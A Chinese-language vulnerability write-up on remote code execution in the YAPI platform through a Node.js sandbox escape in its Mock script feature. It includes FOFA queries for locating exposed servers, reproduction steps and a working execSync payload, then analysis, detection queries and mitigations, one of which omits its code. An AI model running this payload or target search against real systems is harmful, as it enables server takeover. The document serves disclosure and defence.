вҖӢ <з»јеҗҲиҜ„е®ҡеҲ©з”ЁйҡҫеәҰ>пјҡдёӯзӯүпјҢйңҖиҰҒз”ЁжҲ·и®ӨиҜҒгҖӮ

вҖӢ <з»јеҗҲиҜ„е®ҡеЁҒиғҒзӯүзә§>пјҡй«ҳеҚұпјҢиғҪйҖ жҲҗиҝңзЁӢд»Јз Ғжү§иЎҢгҖӮ

вҖӢ YAPIжҳҜз”ұеҺ»е“Әе„ҝзҪ‘з§»еҠЁжһ¶жһ„з»„(з®Җз§°YMFEпјҢдёҖзҫӨз”ұFEгҖҒiOSе’ҢAndroidе·ҘзЁӢеёҲе…ұеҗҢз»„жҲҗзҡ„е…·жғіиұЎеҠӣгҖҒеҲӣйҖ еҠӣе’ҢеҪұе“ҚеҠӣзҡ„еӨ§еүҚз«Ҝеӣўйҳҹ)ејҖеҸ‘зҡ„еҸҜи§ҶеҢ–жҺҘеҸЈз®ЎзҗҶе·Ҙе…·пјҢжҳҜдёҖдёӘеҸҜжң¬ең°йғЁзҪІзҡ„гҖҒжү“йҖҡеүҚеҗҺз«ҜеҸҠQAзҡ„жҺҘеҸЈз®ЎзҗҶе№іеҸ°гҖӮ

вҖӢ YAPIж—ЁеңЁдёәејҖеҸ‘гҖҒдә§е“Ғе’ҢжөӢиҜ•дәәе‘ҳжҸҗдҫӣжӣҙдјҳйӣ…зҡ„жҺҘеҸЈз®ЎзҗҶжңҚеҠЎпјҢеҸҜд»Ҙеё®еҠ©ејҖеҸ‘иҖ…иҪ»жқҫеҲӣе»әгҖҒеҸ‘еёғе’Ңз»ҙжҠӨдёҚеҗҢйЎ№зӣ®пјҢдёҚеҗҢе№іеҸ°зҡ„APIгҖӮ

вҖӢ YApi жҸҗдҫӣдәҶзј–еҶҷJS и„ҡжң¬ж–№ејҸжқҘжҸҗдҫӣиҮӘе®ҡд№үmockеҠҹиғҪпјҢJSи„ҡжң¬иҝҗиЎҢеңЁNodeJsжІҷзӣ’дёҠпјҢз”ұдәҺе®ҳж–№зҡ„жІҷзӣ’еҸӘжҳҜдёәдәҶйҡ”зҰ»дёҠдёӢж–ҮпјҢе№¶дёҚжҸҗдҫӣд»»дҪ•е®үе…ЁдҝқиҜҒпјӣmockи„ҡжң¬иҮӘе®ҡд№үжңҚеҠЎжңӘеҜ№JSи„ҡжң¬еҠ д»Ҙе‘Ҫд»ӨиҝҮж»ӨпјҢз”ЁжҲ·еҸҜд»Ҙж·»еҠ д»»дҪ•иҜ·жұӮеӨ„зҗҶи„ҡжң¬пјҢж”»еҮ»иҖ…еҸҜеҲ©з”ЁиҜҘжјҸжҙһеңЁеҸ—еҪұе“Қзҡ„жңҚеҠЎеҷЁдёҠжү§иЎҢд»»ж„Ҹjavascriptд»Јз ҒпјҢйҖҡиҝҮзІҫеҝғжһ„йҖ зҡ„Javascriptд»Јз ҒеҸҜд»Ҙз»•иҝҮжІҷзӣ’е№¶з”ЁдәҺжү§иЎҢд»»ж„Ҹзі»з»ҹе‘Ҫд»ӨпјҢд»ҺиҖҢеҜјиҮҙиҝңзЁӢд»Јз Ғжү§иЎҢжјҸжҙһпјҢжңҖз»ҲеҜјиҮҙжҺҘз®Ўе№¶жҺ§еҲ¶жңҚеҠЎеҷЁгҖӮ

з”ұдәҺYapiз®ЎзҗҶе№іеҸ°й»ҳи®ӨејҖж”ҫжіЁеҶҢпјҢж”»еҮ»иҖ…еҸҜд»ҘеңЁиҝӣиЎҢз®ҖеҚ•зҡ„жіЁеҶҢд№ӢеҗҺпјҢжһ„йҖ жҒ¶ж„Ҹзҡ„JSд»Јз Ғз»•иҝҮжІҷзӣ’пјҢжңҖз»ҲйҖ жҲҗиҝңзЁӢд»Јз Ғжү§иЎҢиҝӣиЎҢжјҸжҙһеҲ©з”ЁгҖӮ

вҖӢ й—®йўҳзҡ„жң¬иҙЁпјҡеҠҹиғҪж»Ҙз”ЁпјҢJSжІҷз®ұз»•иҝҮеҜјиҮҙиҝңзЁӢд»Јз Ғжү§иЎҢ

0x02 жјҸжҙһеӨҚзҺ°

fofa жҗңзҙўиҜӯеҸҘпјҡ

icon_hash="-715193973"

app=“YApi”

жң¬ең°еӨҚзҺ°пјҡ

вҖӢ Dockerжҗӯе»әжөӢиҜ•зҺҜеўғпјҢеҸӮиҖғж–ҮжЎЈпјҡгҖҠYapi+Dockerзҡ„е®үиЈ…дёҺй…ҚзҪ®гҖӢ

вҖӢ еҲӣе»әе®Ңе®№еҷЁд№ӢеҗҺе°ұеҸҜд»ҘдҪҝз”ЁдәҶгҖӮ

  1. еңЁйҰ–йЎөдёӢж–№жүҫеҲ°зҷ»еҪ•/жіЁеҶҢеҠҹиғҪжҺҘеҸЈпјҢжҲ–зӣҙжҺҘи®ҝй—® /login и·Ҝеҫ„иҝӣиЎҢзҷ»еҪ•е’ҢжіЁеҶҢгҖӮ
  2. зҷ»еҪ•д№ӢеҗҺиҝӣе…ҘдёӘдәәз©әй—ҙпјҢеңЁеҸідҫ§зӮ№еҮ»ж·»еҠ йЎ№зӣ®пјӣ
  3. ж·»еҠ жҲҗеҠҹеҗҺиҝӣе…ҘйЎ№зӣ®пјҢзӮ№еҮ»еҸідҫ§еҗҢдёҖдҪҚзҪ®жңүдёӘвҖңж·»еҠ жҺҘеҸЈвҖқ
  4. ж·»еҠ е®Ңд№ӢеҗҺпјҢжү“ејҖжҺҘеҸЈпјҢиҝӣе…ҘвҖңй«ҳзә§MockвҖқеҠҹиғҪпјҢзӮ№еҮ»и„ҡжң¬пјҢиҫ“е…ҘPocпјҢзӮ№еҮ»дҝқеӯҳеҚіеҸҜгҖӮ
  5. зӮ№еҮ»вҖңйў„и§ҲвҖқпјҢи®ҝй—®Mockең°еқҖпјҢеҚіеҸҜи§ҰеҸ‘жјҸжҙһPOCгҖӮ

POCеҰӮдёӢпјҡ

const process = this.constructor.constructor('return process')()mockJson = process.mainModule.require("child_process").execSync("whoami").toString()

зӮ№еҮ»вҖңйў„и§ҲвҖқпјҢи®ҝй—®Mockең°еқҖпјҢеҚіеҸҜи§ҰеҸ‘жјҸжҙһPOCпјҡ

0x03 жјҸжҙһеҲҶжһҗ

вҖӢ иҝҷдёӘжјҸжҙһзҡ„еҲ©з”ЁжқЎд»¶йҰ–е…ҲйңҖиҰҒз”ЁжҲ·йҖҡиҝҮи®ӨиҜҒпјҢиҖҢYAPI ж”ҜжҢҒд»»ж„Ҹз”ЁжҲ·зҡ„жіЁеҶҢеҠҹиғҪпјҢ

вҖӢ жіЁеҶҢд№ӢеҗҺзҡ„з”ЁжҲ·иҷҪз„¶жІЎжңүд»»дҪ•еҲҶз»„дёҺйЎ№зӣ®зҡ„жқғйҷҗпјҢеӣ жӯӨеҸӘиғҪжҗңзҙўгҖҒжөҸи§Ҳ вҖңе…¬ејҖйЎ№зӣ®вҖқ зҡ„жҺҘеҸЈгҖӮдҪҶжҳҜж–°з”ЁжҲ·зҷ»еҪ•жӢҘжңү дёӘдәәз©әй—ҙ еҲҶз»„дёӢзҡ„е…ЁйғЁжқғйҷҗпјҢдёӘдәәз©әй—ҙеҲҶз»„д»…иҮӘе·ұеҸҜи§ҒпјҢеӣ жӯӨеҸҜд»ҘеңЁиҝҷйҮҢд»»ж„ҸиҜ•з”Ё YApi зҡ„еҠҹиғҪгҖӮ

вҖӢ иҝҷйҮҢд№ҹе°ұеҢ…жӢ¬дәҶй«ҳзә§MockеҠҹиғҪпјҢиҜҘеҠҹиғҪзҡ„жң¬ж„ҸжҳҜж–№дҫҝз”ЁжҲ·зј–еҶҷиҮӘе·ұзҡ„JSи„ҡжң¬пјҢиҜҘи„ҡжң¬е°ҶдјҡиҝҗиЎҢеңЁNodeJSжІҷзӣ’дёҠпјҢдҪҶжҳҜNodeJSжІҷзӣ’е№¶дёҚжҸҗдҫӣе®үе…ЁдҝқиҜҒгҖӮе…ідәҺJSжІҷз®ұзҡ„е®үе…Ёй—®йўҳж—©жңүжҺўи®ЁгҖӮпјҲи§Ғ гҖҠиҜҙиҜҙJSдёӯзҡ„жІҷз®ұгҖӢвҖ”вҖ”и…ҫи®ҜIVWEBеӣўйҳҹпјү

вҖӢ NodeJSдёӯдҪҝз”ЁжІҷз®ұеҫҲз®ҖеҚ•пјҢеҸӘйңҖиҰҒеҲ©з”ЁеҺҹз”ҹзҡ„vmжЁЎеқ—пјҢдҫҝеҸҜд»Ҙеҝ«йҖҹеҲӣе»әжІҷз®ұпјҢеҗҢж—¶жҢҮе®ҡдёҠдёӢж–ҮгҖӮ

 const vm = require('vm'); const x = 1; const sandbox = {x:2}; vm.createContext(sandbox);  //Contextify the sandbox.  const code = 'x += 40;var y=17;'; vm.runInContext(code,sandbox); console.log(sandbox.x);  // 42 console.log(sandbox.y);  // 17 console.log(x);// 1; y is not defined.

вҖӢ vmдёӯжҸҗдҫӣдәҶrunInNewContextгҖҒrunInThisContextгҖҒrunInContextдёүдёӘж–№жі•пјҢдёүиҖ…зҡ„з”Ёжі•жңүдёӘеҲ«еҮәе…ҘпјҢжҜ”иҫғеёёз”Ёзҡ„жҳҜrunInNewContextе’ҢrunInContextпјҢеҸҜд»Ҙдј е…ҘеҸӮж•°жҢҮе®ҡеҘҪдёҠдёӢж–ҮеҜ№иұЎгҖӮ

вҖӢ еҸҜжғңзҡ„жҳҜ еҰӮжһңиҝҷж ·пјҢжҲ‘д»¬еҸҜд»Ҙз”ЁеҺҹеһӢй“ҫз»•иҝҮпјҢеҰӮдёӢ

 const vm = require('vm');   vm.runInNewContext("this.constructor.constructor('return process')().exit()")

вҖӢ зҪ‘дёҠе…ідәҺNodeJSгҖҒжІҷз®ұдёҖзұ»зҡ„е®үе…ЁжҠҖжңҜз ”з©¶д№ҹжңүеҫҲеӨҡпјҢеҸҜд»ҘеҸӮиҖғдёӢеӯҰдёҖеӯҰгҖӮ

вҖӢ еӣһеҲ°иҝҷдёӘжјҸжҙһпјҢе·ІзҹҘMockи„ҡжң¬дјҡеңЁжІҷз®ұдёӯиҝҗиЎҢпјҢйӮЈд№ҲжҲ‘д»¬еҸӘйңҖиҰҒеҲ©з”Ёзұ»дјјдёҠйқўзҡ„еҺҹеһӢй“ҫиҝӣиЎҢз»•иҝҮпјҢйҖҖеҮәжІҷз®ұпјҢеҶҚжһ„йҖ и°ғз”Ёе‘Ҫд»ӨеҚіеҸҜгҖӮ

Pocпјҡ

 const process = this.constructor.constructor('return process')() mockJson = process.mainModule.require("child_process").execSync("whoami").toString()

вҖӢ жіЁж„ҸпјҢиҝҷйҮҢдёҚйңҖиҰҒеҠ  exitпјҢеҠ дәҶд»ҘеҗҺyapiжңҚеҠЎдјҡйҖҖеҮәгҖӮ

зҪ‘дёҠзҡ„Pocе…¶е®һиЎЁиҫҫзҡ„ж„ҸжҖқжҳҜдёҖж ·зҡ„пјҢеҰӮдёӢпјҡ

 const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor('return process') const process = myfun() mockJson = process.mainModule.require("child_process").execSync("whoami").toString()

жҲ‘и®ӨдёәиҝҷдёӘй—®йўҳзҡ„жң¬иҙЁжҳҜеҠҹиғҪзҡ„ж»Ҙз”ЁпјҢJSжІҷз®ұз»•иҝҮеҜјиҮҙиҝңзЁӢд»Јз Ғжү§иЎҢгҖӮд№ӢеүҚзңӢдәҶдёҖдёӘж–ҮжЎЈгҖҠnodejsе‘Ҫд»Өжү§иЎҢе’ҢжІҷз®ұе®үе…ЁгҖӢпјҢд»–жүҖиҜҙзҡ„еҶ…е®№жңүеҜ№д№ҹжңүдёҚеҜ№зҡ„ең°ж–№гҖӮ

вҖӢ дҪңиҖ…и®ӨдёәиҝҷжҳҜдёҖдёӘжӯЈеёёзҡ„еҠҹиғҪпјҢ вҖңеҫҲеӨҡе®үе…Ёдәәе‘ҳжІЎж·ұе…ҘејҖеҸ‘жҲ–иҖ…жҳҜз»“еҗҲеҲ°sdlдёӯпјҢжүҖд»ҘеҜ№иҝҷдәӣйңҖжұӮзҡ„зҗҶи§ЈдёҚж·ұеҲ»гҖӮйӮЈд№ҲеҒҮи®ҫжҲ‘д»¬иҰҒжү§иЎҢиҝҷдёӘйңҖжұӮпјҢиҝҷдёӘйңҖжұӮе°ұжҳҜиҰҒжү§иЎҢд»»ж„Ҹе‘Ҫд»ӨпјҢеӣ дёәдёҡеҠЎдјҡжңүеҚғеҘҮзҷҫжҖӘзҡ„йңҖжұӮпјҢеүҚз«Ҝnodejsе°ұиҰҒжү§иЎҢе‘Ҫд»ӨжқҘжөӢиҜ•зҡ„гҖӮвҖқпјҢжҲ‘иҷҪз„¶д№ҹжҳҜи„ұзҰ»дёҡеҠЎзҡ„е®үе…Ёдәәе‘ҳпјҢдҪҶд№ҹзӣёдҝЎзЎ®е®һеӯҳеңЁеҗ„з§Қд№ұдёғе…«зіҹзҡ„йңҖжұӮпјҢжү§иЎҢе‘Ҫд»Өд№ҹзЎ®е®һжңүе®ғзҡ„е®ўи§ӮйңҖиҰҒгҖӮ

вҖӢ дҪҶж–Үз« дҪңиҖ…и®ӨдёәиҝҷдёӘжӯЈеёёзҡ„еҠҹиғҪпјҢдёҚйңҖиҰҒдҝ®еӨҚпјҢжҲ‘и§үеҫ—дёҚеҜ№гҖӮ

вҖӢ Mock жҸҗдҫӣзҡ„JSи„ҡжң¬зЎ®е®һжҳҜжӯЈеёёзҡ„еҠҹиғҪпјҢдҪҶжҳҜдёҚжҳҜзңҹзҡ„йңҖиҰҒз»ҷд»»дҪ•дәәйғҪејҖж”ҫиҝҷдёӘжқғйҷҗе‘ўпјҹ

вҖӢ жҲ‘и®ӨдёәиҝҷжҳҜдёҖдёӘеҠҹиғҪзҡ„ж»Ҙз”ЁпјҢMockзҡ„еҲқиЎ·жҳҜеҘҪзҡ„пјҢдҪҶжҳҜеҚҙе®№жҳ“еҜјиҮҙиў«ж”»еҮ»иҖ…жҒ¶ж„ҸеҲ©з”ЁпјҢйҖ жҲҗзҡ„еҚұе®іжҳҜйҮҚеӨ§зҡ„гҖӮе®үе…ЁжҳҜдёҖй—Ёе№іиЎЎзҡ„иүәжңҜпјҢжҳҜдёәдәҶдҝқйҡңдёҡеҠЎжҢҒз»ӯзЁіе®ҡе®үе…Ёзҡ„иҝҗиЎҢгҖӮиҝҷж¬Ўзҡ„й—®йўҳиҝҳжҳҜдҫ§йҮҚеңЁз”ЁжҲ·жқғйҷҗдёҠпјҢе®ҳж–№е…Ғи®ёж–°з”ЁжҲ·зҷ»еҪ•жӢҘжңү дёӘдәәз©әй—ҙ еҲҶз»„дёӢзҡ„е…ЁйғЁжқғйҷҗпјҢеҸҜд»ҘеңЁиҝҷйҮҢд»»ж„ҸиҜ•з”Ё YApi зҡ„еҠҹиғҪпјҢиҝҷж ·д»»дҪ•дәәйғҪеҸҜд»ҘиҝҗиЎҢMockи„ҡжң¬пјҢз»§иҖҢй—ҙжҺҘеҜјиҮҙд»»дҪ•дәәйғҪеҸҜд»ҘжҺ§еҲ¶жңҚеҠЎеҷЁжқғйҷҗпјҢиҝҷжҳҜеӯҳеңЁе®үе…ЁйҡҗжӮЈзҡ„гҖӮ

вҖӢ жҲ‘и®ӨдёәжҲ–и®ёеҸҜд»ҘиҝӣиЎҢе№іиЎЎпјҢйҷҗеҲ¶жҷ®йҖҡз”ЁжҲ·зҡ„жқғйҷҗпјҢеҸӘе…Ғи®ёеҸҜдҝЎзҡ„дәәжқҘж“ҚдҪңпјҢеҜ№жқғйҷҗиҝӣиЎҢе®Ңе–„еҲ’еҲҶпјҢеҜ№дәҺеҸҜд»ҘжҺ§еҲ¶жңҚеҠЎеҷЁгҖҒжү§иЎҢзі»з»ҹе‘Ҫд»Өзҡ„иҝҷдәӣй«ҳеҚұж“ҚдҪңеә”еҪ“дәҲд»ҘйҷҗеҲ¶зӯүгҖӮ

вҖӢ дёҚиҝҮпјҢиҝҷд№ҹиҝҷжҳҜдёҖдёӘи„ұзҰ»дёҡеҠЎзҡ„е®үе…Ёдәәе‘ҳзҡ„зІ—жө…жғіжі•пјҢиҰҒж №жҚ®е®һйҷ…иҝӣиЎҢеӨ„зҗҶгҖӮ

вҖӢ ж„ҹи§үеҸҲжҳҜдёҖдёӘиңңзҪҗзҙ жқҗпјҹ

0x04 еЁҒиғҒжҺ’жҹҘ

1гҖҒдҪҝз”Ёз®ЎзҗҶе‘ҳиҙҰеҸ·зҷ»еҪ•YAPIпјҢеңЁз”ЁжҲ·з®ЎзҗҶдёӯжҺ’жҹҘе№¶еҲ йҷӨејӮеёёз”ЁжҲ·гҖӮ

2гҖҒйҖҡиҝҮе…ій”®еӯ—пјҲprocessгҖҒexecгҖҒrequireзӯүпјүпјҢеңЁadv_mockйӣҶеҗҲзҡ„mock_scriptеҹҹдёӯжҗңзҙўжҳҜеҗҰеӯҳеңЁжҒ¶ж„Ҹзҡ„javascriptи„ҡжң¬гҖӮ

db.adv_mock.find({mock_script: /exec/});

еҮәиҮӘпјҡгҖҠгҖҗеӨ„зҪ®жүӢеҶҢгҖ‘YAPIиҝңзЁӢд»Јз Ғжү§иЎҢ0dayжјҸжҙһгҖӢ

0x05 зј“и§ЈжҺӘж–Ҫ

зӣ®еүҚе®ҳж–№жҡӮжңӘй’ҲеҜ№иҜҘжјҸжҙһеҸ‘еёғдҝ®еӨҚж–№жЎҲпјҢиҜ·еҸ—еҪұе“Қзҡ„з”ЁжҲ·еҸӮиҖғдёӢеҲ—жҺӘж–ҪиҝӣиЎҢйҳІжҠӨпјҡ1гҖҒе…ій—ӯYAPIз”ЁжҲ·жіЁеҶҢеҠҹиғҪ

еңЁ config.json дёӯж·»еҠ д»ҘдёӢй…ҚзҪ®йЎ№пјҢзҰҒжӯўз”ЁжҲ·жіЁеҶҢжҲ–еҗҜз”ЁLDAPи®ӨиҜҒпјҡ

 {
    "closeRegister":true
 }

дҝ®ж”№е®ҢжҲҗеҗҺпјҢйҮҚеҗҜ YAPI жңҚеҠЎз”ҹж•ҲгҖӮ

2)гҖҒеңЁexts/yapi-plugin-andvanced-mock/server.jsж–Үд»¶дёӯжүҫеҲ°пјҡ

if (caseData && caseData.case_enable) {...}

е№¶ж·»еҠ дёӢеҲ—д»Јз Ғпјҡ

if(!yapi.WEBCONFIG.mock) { return false; }

3гҖҒеҜ№й«ҳзә§MockеҠҹиғҪиҝӣиЎҢе…ій”®еӯ—иҝҮж»Ө

еңЁ/server/utils/commons.jsж–Үд»¶дёӯжүҫеҲ°пјҡ

sandbox = yapi.commons.sandbox(sandbox, script);

е№¶ж·»еҠ дёӢеҲ—д»Јз Ғпјҡ

еҲ©з”ЁиҜ·жұӮзҷҪеҗҚеҚ•зҡ„ж–№ејҸйҷҗеҲ¶ YAPI зӣёе…із«ҜеҸЈ

5гҖҒдҝ®ж”№з®ЎзҗҶе‘ҳй»ҳи®ӨиҙҰеҸ·еҸЈд»ӨпјҢжё…йҷӨејұеҸЈд»ӨгҖӮ

6гҖҒжЈҖжҹҘеҲ йҷӨжҒ¶ж„ҸиҙҰжҲ·

еҸҠж—¶жЈҖжҹҘеҲ йҷӨжҒ¶ж„ҸиҙҰжҲ·пјҢеҗҢжӯҘеҲ йҷӨжҒ¶ж„Ҹз”ЁжҲ·еҲӣе»әзҡ„жҺҘеҸЈд»ҘеҸҠд»–д»¬дёҠдј зҡ„жҒ¶ж„Ҹmockи„ҡжң¬д»ҘйҳІжӯўдәҢж¬Ўж”»еҮ»гҖӮ
